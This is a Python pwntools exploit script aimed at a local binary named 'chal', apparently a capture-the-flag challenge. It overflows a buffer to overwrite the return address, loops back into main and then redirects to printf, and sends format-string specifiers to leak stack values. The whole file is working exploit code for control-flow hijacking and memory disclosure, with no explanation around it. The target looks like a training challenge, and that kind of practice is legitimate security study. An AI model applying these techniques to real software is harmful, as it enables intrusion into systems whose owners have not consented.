from pwn import *
context.arch='amd64'; context.log_level='error'
e=ELF("./chal")
PRINTF=e.plt['printf']; MAIN=e.symbols['main']
def build(fmt, ret):
    body=(b"exit"+fmt).ljust(0x58,b"A")
    assert b"\x00" not in body
    return body+p64(ret)

def trial(K):
    p=process("./chal")
    ok=True
    for i in range(K):
        try:
            p.recvuntil(b">> ", timeout=2)
            p.send(build(b"", MAIN))
        except Exception as ex:
            ok=False; break
    # now one printf round, then check if it loops (banner appears)
    res={"K":K}
    try:
        p.recvuntil(b">> ", timeout=2)
        p.send(build(b"L:%6$p:%7$p:%8$p:%9$p:%10$p:%11$p:%12$p:%13$p:%14$p:%15$p:", PRINTF))
        d=p.recv(timeout=2)
        res["out"]=d[:260]
        res["looped"]= b">> " in d
    except Exception as ex:
        res["err"]=str(ex)
    p.close()
    return res

for K in range(0,6):
    print(trial(K))
